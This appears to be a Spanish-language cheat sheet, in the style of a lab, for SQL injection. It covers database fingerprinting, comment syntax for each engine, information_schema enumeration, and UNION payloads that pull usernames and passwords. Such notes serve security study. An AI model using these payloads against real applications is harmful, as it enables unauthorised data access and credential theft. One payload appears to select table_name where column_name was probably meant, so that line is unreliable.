# Requisitos para explotar una vulnerabilidad SQLi

A veces para explotar la vulnerabilidad de SQLi, hay que saber:

* El tipo y versión del software de base de datos.
* Las tablas y columnas que contiene la base de datos.

---

## Consultar el tipo y versión de la base de datos

Consultas para algunos tipos de base de datos:

* **Microsoft / MySQL**

```sql
SELECT @@version
```

* **Oracle**

```sql
SELECT * FROM v$version
```

* **PostgreSQL**

```sql
SELECT version()
```

Ejemplo de uso en payload:

```
' UNION SELECT @@version--
```

Para ver qué tipo de base de datos es, tras determinar el número de columnas con `UNION` (verificando cuántas columnas devuelve la consulta original), pruebe las distintas formas de comentar que usan las bases de datos. Ejemplo:

```
' UNION SELECT NULL,NULL#
```

Si esto es válido, ya sabes qué tipo de base de datos es y su sintaxis de comentarios.

---

## Comentarios

You can use comments to truncate a query and remove the portion of the original query that follows your input.

* **Oracle:** `--comment`
* **Microsoft:** `--comment` / `/*comment*/`
* **PostgreSQL:** `--comment` / `/*comment*/`
* **MySQL:** `#comment`  (también `-- comment` — observe el espacio tras `--`)
* **En general:** `/*comment*/`

---

## Consultas para obtener la versión (resumen)

* **Oracle**

```sql
SELECT banner FROM v$version
SELECT version FROM v$instance
```

* **Microsoft**

```sql
SELECT @@version
```

* **PostgreSQL**

```sql
SELECT version()
```

* **MySQL**

```sql
SELECT @@version
```

---

## LISTADO DEL Contenido de la base de datos

La mayoría de tipos de base de datos, excepto **Oracle**, tienen un esquema de información que proporciona datos sobre la base de datos.

---

### Consultar tablas

```sql
SELECT * FROM information_schema.tables
```

Payload:

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

---

### Consultar columnas

```sql
SELECT * FROM information_schema.columns WHERE table_name='Users'
```

Payload:

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.columns+WHERE+table_name='nombretabla'--
```

`table_name` es una columna que pertenece a `information_schema.tables`.

---

Se debe comprobar que las dos columnas utilizadas en ambas consultas contengan datos de tipo cadena.

---

### Ver el contenido de las columnas de una tabla

```sql
' UNION SELECT username_qekzmb,password_dneajr FROM users_nbmzma--
```

---

*Fin del documento — contenido reestructurado manteniendo solo la información proporcionada.*


